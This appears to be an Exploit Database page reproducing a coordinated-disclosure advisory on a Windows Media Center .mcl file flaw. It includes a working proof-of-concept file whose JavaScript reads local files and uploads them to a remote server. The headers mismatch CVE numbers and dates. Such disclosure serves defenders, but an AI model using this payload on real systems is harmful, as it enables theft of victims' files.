## Vulnerability Information

## Media Center Library Parsing RCE Vulnerability - CVE-2015-6131

A vulnerability exists in Windows Media Center that could allow remote code execution if Windows Media Center opens a specially crafted Media Center link (.mcl) file that references malicious code. An attacker who successfully exploited this vulnerability could take control of an affected system. Customers whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights. Workstations are primarily at risk of this vulnerability.

To exploit the vulnerability, user interaction is required. In a web-browsing scenario, a user would have to navigate to a compromised website that an attacker is using to host a malicious .mcl file. In an email attack scenario, an attacker would have to convince a user who is logged on to a vulnerable workstation to click a specially crafted link in an email. The security update addresses the vulnerability by correcting how Windows Media Center handles certain resources in the .mcl file.

Microsoft received information about this vulnerability through coordinated vulnerability disclosure. At the time this security bulletin was originally issued, Microsoft was unaware of any attack attempting to exploit this vulnerability.

1. Advisory Information

Title: Microsoft Windows Media Center link file incorrectly resolved reference
Advisory ID: CORE-2015-0014
Advisory URL: http://www.coresecurity.com/advisories/microsoft-windows-media-center-link-file-incorrectly-resolved-reference
Date published: 2015-12-08
Date of last update: 2015-12-04
Vendors contacted: Microsoft
Release mode: Coordinated release

2. Vulnerability Information

Class: Use of Incorrectly-Resolved Name or Reference [CWE-706]
Impact: Information leak
Remotely Exploitable: No
Locally Exploitable: Yes
CVE Name: CVE-2015-6127

3. Vulnerability Description

The 'application' tag in Microsoft [1] Windows Media Center link files (.mcl extension) can include a 'run' parameter, which indicates the path of a file to be launched when opening the MCL file, or a 'url' parameter, which indicates the URL of a web page to be loaded within the Media Center's embedded web browser.

A specially crafted MCL file having said 'url' parameter pointing to the MCL file itself can trick Windows Media Center into rendering the very same MCL file as a local HTML file within the Media Center's embedded web browser.

4. Vulnerable Packages

Windows 7 for x64-based Systems Service Pack 1 (with Internet Explorer 11 installed)
Other versions are probably affected too, but they were not checked.

5. Vendor Information, Solutions and Workarounds

Microsoft posted the following Security Bulletin: MS15-134 [2]

6. Credits

This vulnerability was discovered and researched by Francisco Falcon from Core Exploits Team. The publication of this advisory was coordinated by Joaquín Rodríguez Varela from the Core Advisories Team.

7. Technical Description / Proof of Concept Code

The ehexthost.exe binary, part of Windows Media Center, loads the given URL into an embedded instance of Internet Explorer running in the local machine zone, but it doesn't opt-in for the FEATURE_LOCALMACHINE_LOCKDOWN IE security feature, therefore this situation can be leveraged by an attacker to read and exfiltrate arbitrary files from a victim's local filesystem by convincing him to open a malicious MCL file.

The proof-of-concept shows an MCL file with embedded HTML + JS code, referencing itself in the 'url' parameter. Unlike what happens when loading a local HTML file into Internet Explorer 11, the JS code included here will automatically run with no prompts, and it will be able to read arbitrary local files using the MSXML2.XMLHTTP ActiveX object. Those read files then can be uploaded to an arbitrary remote web server.

Also note that, in order for the PoC to work, the value of the 'url' parameter must match the name of the MCL file.

7.1. Proof of Concept

A new file should be created with the name "poc-microsoft.mcl" and with the following content:

<application url="poc-microsoft.mcl"
name="Showcase"
bgcolor="RGB(255,255,255)"
sharedviewport="false">
<html>
<head>
<meta http-equiv="x-ua-compatible" content="IE=edge" >
</head>
<body>
<script type="text/javascript">

    function do_upload(fname, data){
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.open("POST", "http://192.168.1.50/uploadfile.php", true);
        xmlhttp.setRequestHeader("Content-type", "multipart/form-data");
        xmlhttp.setRequestHeader("Connection", "close");
        xmlhttp.onreadystatechange = function(){if (xmlhttp.readyState == 4){alert(fname + " done.");}}
        xmlhttp.send(new Uint8Array(data));
    }

    function read_local_file(filename){
        /* Must use this one, XMLHttpRequest() doesn't allow to read local files */
        var xmlhttp = new ActiveXObject("MSXML2.XMLHTTP");
        xmlhttp.open("GET", filename, false);
        xmlhttp.send();
        return xmlhttp.responseBody.toArray();
    }

    function upload_file(filename){
        try{
            do_upload(filename, read_local_file(filename));
        }catch(e){
            alert(filename + " error: " + e);
        }
    }

    upload_file("file:///C:/Windows/System32/calc.exe");

</script>
</body>
</html>

</application>

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
